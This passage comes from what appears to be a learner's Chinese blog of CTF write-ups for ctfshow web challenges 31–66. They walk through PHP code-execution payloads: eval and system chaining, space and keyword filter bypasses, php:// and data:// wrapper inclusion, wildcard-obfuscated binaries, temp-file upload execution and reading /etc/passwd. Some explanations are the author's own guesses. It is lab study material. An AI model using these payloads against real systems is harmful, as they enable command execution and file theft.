<p>7.isset()函数用于检查变量是否已设置且非null。if(isset($_GET[‘c’])){</p>
<p>8.eval()函数会将传入的字符串作为 PHP 代码执行</p>
<p>9.error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)</p>
<p>10.Linux通配符:  cat * [] {} ?</p>
<p>11.phpinfo();当中的disable_functions后面跟的值是禁用的函数</p>
<p>12.?c=system(“cat *.php&gt;&gt;1.txt”);把所有php的内容写到txt里面</p>
<p>13.scandir(“.”)表示扫描当前目录，一个点是当前目录，两个点是上级目录.套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
<p>那在前面拼接一个cat是不是可以拿到flag？</p>
<p>14.shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令.反引号和shell_exec()函数同理</p>
<ol start="15">
<li>?c=passthru(‘cat f*’);</li>
</ol>
<p>​		?c=echo cat [f]*;注意看源代码，你看你的软件，肯定没回显的</p>
<p>​		?c=echo cat [f]* &gt;&gt; 1.txt;</p>
<p>16.?c=eval($_GET[a]);&amp;a=system(‘cat flag.php’);</p>
<p>代码解释：从get当中获取了一个超全局变量a，并使用eval函数将其作为php代码执行</p>
<p>通过a来拿到flag，但这里似乎是在preg_match外运行的，不会受过滤的影响</p>
<p>$符号可以类比java当中的int</p>
<ol start="17">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格绕过</span><br><span class="line"></span><br><span class="line">%09 符号需要php环境</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line"></span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
<ol start="18">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat过滤</span><br><span class="line"></span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line"></span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line"></span><br><span class="line">head:查看头几行</span><br><span class="line"></span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"></span><br><span class="line">tail:查看尾几行</span><br><span class="line"></span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line"></span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line"></span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">sort:可以查看</span><br><span class="line"></span><br><span class="line">uniq:可以查看</span><br><span class="line"></span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
<p>19…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php无需括号的函数</span><br><span class="line"></span><br><span class="line">echo 123;</span><br><span class="line"></span><br><span class="line">print 123;</span><br><span class="line"></span><br><span class="line">die;</span><br><span class="line"></span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">例如?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">或者?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
<p>20.?&gt;符号相当于和前面的&lt;?php对应了，然后后面的代码会在空间外执行</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>web31-命令执行结束</title>
    <url>/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/</url>
    <content><![CDATA[<h1>Web31</h1>
<p>?c=eval($_GET[a]);&amp;a=system(‘cat flag.php’);</p>
<p><img src="wps1.jpg" alt="img"></p>
<p>我们相当于在if这个条件里面添加了一个新的参数a，然后通过这个参数a进行操作</p>
<p>理解过程，我们先传进去了?c=eval($_GET[a]);，这串代码成功地执行了，并且跳出了if和else函数，然后在调用参数a，&amp;a=system(‘cat flag.php’);</p>
<p>各种payload：</p>
<p>?c=echo(<code>tac%09f*</code>);</p>
<p>?c=echo(<code>tail%09f*</code>);</p>
<p>需要查看源码：</p>
<p>?c=echo(<code>nl%09f*</code>);</p>
<p>?c=echo(<code>less%09f*</code>);</p>
<p>?c=echo(<code>more%09f*</code>);</p>
<p>…</p>
<p>见下绕过方法</p>
<p>ctfshow{15b00389-8276-40c6-a865-92ae407d30e4}</p>
<p>空格绕过</p>
<p>%09 符号需要php环境</p>
<p>{cat,flag.txt}</p>
<p>cat${IFS}flag.txt</p>
<p>cat$IFS$9flag.txt</p>
<p>cat&lt;flag.txt</p>
<p>cat&lt;&gt;flag.txt</p>
<p>kg=$‘\x20flag.txt’&amp;&amp;cat$kg</p>
<p>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
<p>cat过滤</p>
<p>more:一页一页的显示档案内容</p>
<p>less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</p>
<p>head:查看头几行</p>
<p>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>
<p>tail:查看尾几行</p>
<p>nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</p>
<p>od:以二进制的方式读取档案内容</p>
<p>vi:一种编辑器，这个也可以查看</p>
<p>vim:一种编辑器，这个也可以查看</p>
<p>sort:可以查看</p>
<p>uniq:可以查看</p>
<p>file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</p>
<p>来源：<a href="https://blog.csdn.net/qq_49480008/article/details/113177878">https://blog.csdn.net/qq_49480008/article/details/113177878</a></p>
<p>Web32</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=system(‘cat flag.php’);</p>
<p>%0a是换行符url编码</p>
<p>include是 PHP 中的一个语句，用于将指定文件包含到当前 PHP 文件中</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=flag.php</p>
<p>这个由于前面没有分号，不能正常输出</p>
<p>最终正确payload：</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者：</p>
<p>?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>%0a和&quot;&quot;的区别还需考量</p>
<p>文件包含，可以直接用插件写，后面加上文件，最后解码</p>
<p>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7NDg3MjQ5NmUtNDdkYy00M2E3LTkyYzItZDJmNjRhMzQxNjU3fSI7DQo</p>
<p>ctfshow{4872496e-47dc-43a7-92c2-d2f64a341657}</p>
<p>php无需括号的函数</p>
<p>echo 123;</p>
<p>print 123;</p>
<p>die;</p>
<p>include “/etc/passwd”;</p>
<p>require “/etc/passwd”;</p>
<p>include_once “/etc/passwd”;</p>
<p>require_once “etc/passwd”;</p>
<h1>Web33</h1>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{9e4bb5c3-42bd-4f47-be4b-eb8cd78f7319}</p>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>和</p>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>的区别是：有引号，优先执行</p>
<h1>Web34</h1>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{e5e97ce9-f824-476c-bb46-97fd0fa94d55}</p>
<h1>Web35</h1>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{c0c4ecbe-0caf-4c5a-969b-1db575e377d1}</p>
<p>Web36</p>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{5dc7f14c-82ab-419a-8a07-54f76fbcee7b}</p>
<p>Web37</p>
<p><img src="wps2.jpg" alt="img"></p>
<p>他在里面又套了一个include，并且过滤了flag</p>
<p>那我们的</p>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>就失效了</p>
<p>新方法：</p>
<p>?c=data://text/plain,<?php system('cat fla*');?></p>
<p>ctfshow{0b8aa5cc-30a5-48bc-89e6-eca36f2c77bd}</p>
<p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p>
<p>伪协议的一种</p>
<h1>Web38</h1>
<p>题目里面过滤了php，所以?c=data://text/plain,<?php system('cat fla*');?>就不行了，因为里面有php，我们可以把php换成等号=，短标签</p>
<p>?c=data://text/plain,<?= system('cat fla*');?></p>
<p>另外一个办法</p>
<p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCAiKTs/Pg==      //<?php system("nl flag.php ");?></p>
<p>Tac和ni都可以但是cat就不行，为啥，</p>
<p>ctfshow{76f2194a-afc2-40bd-b338-9010ea69bbe3}</p>
<h1>Web39</h1>
<p><img src="wps3.jpg" alt="img"></p>
<p>他在后面又加了一个.php没有用，因为我们已经用?&gt;合并了php代码</p>
<p>?c=data://text/plain,<?php system('cat fla?.php'); ?></p>
<p>他在后面加了.php那后面应该会报错，但是不影响我们拿flag</p>
<p>ctfshow{20616819-94c2-4f03-b3a8-d8bc1cb4042d}</p>
<h1>Web40</h1>
<p>函数 localeconv() 会返回一个包含本地环境信息的数组</p>
<p>pos()和 current()是等价的函数，它们会返回数组的当前元素</p>
<p>对于 localeconv()函数返回的数组，使用 pos(localeconv()) 通常会返回该数组的第一个元素的值，如果这个元素是点则返回点，如果是flag则返回flag</p>
<p>scandir()函数用于扫描指定目录的文件和目录，由于 pos(localeconv()) 可能返回 点，所以 scandir(pos(localeconv())) 等价于scandir(“.”)。</p>
<p>scandir(“.”)会返回一个包含当前目录下所有文件和目录名称的数组</p>
<p>array_reverse()函数将数组中的元素顺序反转。例如，对于 array(‘.’, ‘…’, ‘index.php’, ‘config.php’, ‘images’)，会变成 array(‘images’, ‘config.php’, ‘index.php’, ‘…’, ‘.’)。</p>
<p>next()函数将数组的内部指针向前移动一个位置，并返回新位置的元素。</p>
<p>对于 array_reverse(scandir(pos(localeconv()))) 结果，它会跳过第一个元素（例如 images），返回下一个元素（例如 config.php）。</p>
<p>show_source() 函数用于显示指定 PHP 文件的源代码，会高亮显示文件内容。</p>
<p>最终</p>
<p>payload?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
<p>ctfshow{231f7098-5080-450c-9cb1-454610f590e7}</p>
<p>另一种方法，但好像不可以拿到flag</p>
<p>c=session_start();system(session_id());</p>
<p>Cookie=PHPSESSID=ls</p>
<h1>web41</h1>
<p>这道题没得说</p>
<p><a href="https://www.bilibili.com/video/BV1jy4y1a7Ew/?p=13&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41">https://www.bilibili.com/video/BV1jy4y1a7Ew/?p=13&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41</a></p>
<p>真服了，字母数字都禁了。还要脚本</p>
<h1>web42</h1>
<p><strong>&gt;/dev/null 2&gt;&amp;1</strong></p>
<p><strong>可以将/dev/null看作&quot;黑洞&quot;. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong></p>
<p>2和1与错误输出和标准输入有关</p>
<p>总之就是不进行回显</p>
<p>那么题目里面又给了一个sys，并在里面把我们的回显给噶了</p>
<p>那么我们在一个sys里面能否执行多个指令？</p>
<p>这就需要命令分割了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>
<p>?c=cat flag.php ||</p>
<p>?c=cat flag.php ;</p>
<p>使用&amp;&amp;或者&amp;也可以，但是要对其进行url编码</p>
<p>?c=tac flag.php %26%26</p>
<p>ctfshow{631405df-72b0-4dab-aa64-f95c49f4924a}</p>
<h1>web43</h1>
<p>没有过滤||</p>
<p>?c=tac flag.php ||</p>
<p>ctfshow{d4f5849a-36c4-4026-a1b4-a2fed591d86a}</p>
<h1>web44</h1>
<p>cat绕过+通配符+命令分隔</p>
<p>?c=tac fl* ||</p>
<p>ctfshow{28d36c8d-f2cf-4c1d-bc7f-33d2270a8dd3}</p>
<h1>web45</h1>
<p>cat、空格绕过+通配符+命令分隔</p>
<p>这里tac也不行了</p>
<p>这里空格过滤指过滤了“ ”和“%20”</p>
<p>?c=nl%09fla*||</p>
<p>ctfshow{0d3c9cea-3c56-4439-b8cd-bf30b77b3b3f}</p>
<h1>web46</h1>
<p>过滤了数字，但是%09不属于数字</p>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{44400151-8bf6-4fe7-b2f1-647b96b0b8a8}</p>
<h1>web47</h1>
<p>/?c=nl%09fla?.php||</p>
<p>ctfshow{98523018-46d3-48c2-8baa-b4043f0ebf07}</p>
<h1>web48</h1>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{d022aafe-76da-4be9-867e-88322ce50ef9}</p>
<h1>web49</h1>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{89335b6d-8017-4792-a711-61a8b40d5ba9}</p>
<h1>web50</h1>
<p>&lt;&gt;与html编程有关，好像这里加一个这个可以弄出来一个空格</p>
<p>反斜杠\是转义字符。在 <code>fla\g.php</code> 中，可能是试图将 <code>g</code> 转义，使得 <code>fla\g.php</code> 不会被当作一个整体，而被解释为 <code>fla</code> 和 <code>g.php</code></p>
<p>''也没有什么含义，就是绕过了flag过滤</p>
<p>?c=tac&lt;&gt;fla\g.php||</p>
<p>?c=tac&lt;&gt;fla’'g.php||</p>
<p>ctfshow{e6f38678-4786-4b07-8c0c-c0afeb267603}</p>
<h1>web51</h1>
<p>题目把tac噶了</p>
<p>?c=nl&lt;&gt;fla’'g.php||</p>
<p>ctfshow{e43bd801-f9f9-4c0a-a0b8-235be559465b}</p>
<h1>web52</h1>
<p>?c=nl${IFS}fla’'g.php||</p>
<p>flag竟然是假的</p>
<p>看看根目录</p>
<p>?c=ls${IFS}/||</p>
<p>看到flag</p>
<p>?c=nl${IFS}/flag||</p>
<p>ctfshow{679e044a-5050-4f3b-847f-df73a21e1399}</p>
<h1>web53</h1>
<p>这里题目变了</p>
<p><img src="image-20250122001017484.png" alt="image-20250122001017484"></p>
<p>?c=nl${IFS}fla\g.php</p>
<p>ctfshow{321965b6-59b8-4416-93b4-2d92b628f457}</p>
<h1>web54</h1>
<p>grep test *file   在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
<p>?c=grep${IFS}%27{ %27${IFS}fl???php</p>
<p>意思就是在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行</p>
<p>?c=mv${IFS}fla?.php${IFS}b.txt</p>
<p>使用mv时，flag.php将会被删除</p>
<p>进入/b.txt</p>
<p>ctfshow{49f89c5e-7c29-4adf-9077-e1ad0993f5ad}</p>
<h1>web55</h1>
<p>这题目真骚，payload更骚</p>
<p>?c=/???/???64%20???.???</p>
<table>
<thead>
<tr>
<th>**bin目录:**bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</th>
</tr>
</thead>
</table>
<p>这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php</p>
<p>羽大佬的WP还有一种解法</p>
<p>如下：payload：?c=/???/???/???2 ???.??? 然后在url + /flag.php.bz2</p>
<table>
<thead>
<tr>
<th>/usr/bin目录:主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。</th>
</tr>
</thead>
</table>
<p>我们可以利用/usr/bin下的<strong>bzip2</strong></p>
<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p>
<p>ctfshow{1a3616a8-6ae4-4951-a6b3-5f0631c6279c}</p>
<h1>web56</h1>
<p>新知识，无post上传文件，我们可以创建窗口上传文件来运行脚本拿到flag</p>
<p>造一个post上传文件的数据包</p>
<p>在桌面创建post.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://08f987d7-d95f-4f18-a2ab-5d9915f7349f.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再创建文件1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>shell程序必须以&quot;#!/bin/sh&quot;开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p>
<p>打开post.html（注意里面的链接改为题目的链接）</p>
<p>上传1.php</p>
<p>用bp抓包</p>
<p>严格按照图片的格式，好像是不等多一行，空白也不行。</p>
<p>然后发送多次，就可以了</p>
<p>之后改成cat flag.php就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[</span><br></pre></td></tr></table></figure>
<p>1.php就是我们上传的可控的文件，我们传的参数c的值为 . /bin/phpXXXXXX，意思就是说匹配上传1.php文件所生成的临时文件，并执行之</p>
<p><img src="image-20250121181036702.png" alt="image-20250121181036702"></p>
<p>ctfshow{a3f7bc05-69a7-40af-9510-22fa6996596</p>
<h1>web57</h1>
<p>flag在36.php，并且在sys里面已经把命令和后缀给我们了，直接搞出来36就行了</p>
<p><img src="image-20250121194051599.png" alt="image-20250121194051599"></p>
<p><em><strong>算术扩展（Arithmetic Expansion）运算</strong></em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出 5</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">2</span> + <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 乘以 2 的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> * <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 除以 2 的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> / <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 对 3 取模的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> % <span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<p>~代表取反</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以下是更详细的代码示例，对0取反，就是对0的二进制，0进行取反，取反后为-1</span></span><br><span class="line">00000000 00000000 00000000 00000000(假设为32位整数)</span><br><span class="line">取反</span><br><span class="line">11111111 11111111 11111111 11111111</span><br><span class="line"><span class="built_in">echo</span> $((~<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 输出为 -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一个示例，将 5 进行按位取反</span></span><br><span class="line"><span class="built_in">echo</span> $((~<span class="number">5</span>))</span><br><span class="line"><span class="comment"># 先将 5 表示为二进制：00000000 00000000 00000000 00000101</span></span><br><span class="line"><span class="comment"># 取反后：11111111 11111111 11111111 11111010</span></span><br><span class="line"><span class="comment"># 这是 -6 的补码表示，因此输出为 -6</span></span><br></pre></td></tr></table></figure>
<p>算出36</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> $(())</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())+$((~$(())))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(($((~$(())+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(($((~$(())+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">输出后是:</span><br><span class="line">0</span><br><span class="line">---------1</span><br><span class="line">-1</span><br><span class="line">---------2</span><br><span class="line">-2</span><br><span class="line">---------3</span><br><span class="line">-36</span><br><span class="line">---------4</span><br><span class="line">35</span><br><span class="line">---------5</span><br><span class="line">36</span><br></pre></td></tr></table></figure>
<p>那么</p>
<p>?c=$((~$(($((~$(())+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</p>
<p>如果过滤了加号+</p>
<p>?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</p>
<p>ctfshow{3c196564-646f-4120-ae93-1d9f372db21d}</p>
<h1>web58-65</h1>
<p>存在禁用函数，需要各种函数都试试</p>
<p>post</p>
<p>1.c=echo highlight_file(‘flag.php’);<br>
2.c=show_source(“flag.php”);<br>
3.c=highlight_file(“flag.php”);这个应该算是通杀啊，因为在源码就是通过这个函数来显示的，就在else里面highlight_file</p>
<p>4.c=echo file_get_contents(‘flag.php’);</p>
<p>5.c=include(‘flag.php’);echo $flag;</p>
<p>为什么$flag?这是一个变量，相当于我们在java当中int flag = 123456789，然后通过system.out.print(a);打印出来a，也就是123456789这几个赋值给a的数字</p>
<p>之前拿flag不是会进去源码看吗？</p>
<p>里面会有这样的一行代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;a24e6a78-ca48-41ea-8099-904edab2b001&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>6.文件包含相当于咱们学的Java引入一个数据库，然后通过查看什么东西就可以拿到咱们引入的文件的内容</p>
<p>那么我们c=include(‘falg.php’);var_dump(get_defined_vars());</p>
<p>var_dump(get_defined_vars());是拿到所有的注册变量，然后通过var_dump()输出所有变量</p>
<p>7.post里面用一个文件包含，传上去一个a</p>
<p>在url后面加一个?a=php://filter/convert.base64-encode/resource=flag.php</p>
<p><img src="image-20250121202846868.png" alt="image-20250121202846868"></p>
<p>ctfshow{6392df6a-91bd-4704-9398-b7cd00e15aaf}</p>
<p>8.c=rename(‘flag.php’,‘1.txt’)然后进入1.txt查看</p>
<p>9.c=show_source(next(array_reverse(scandir(‘.’))));</p>
<h1>web66</h1>
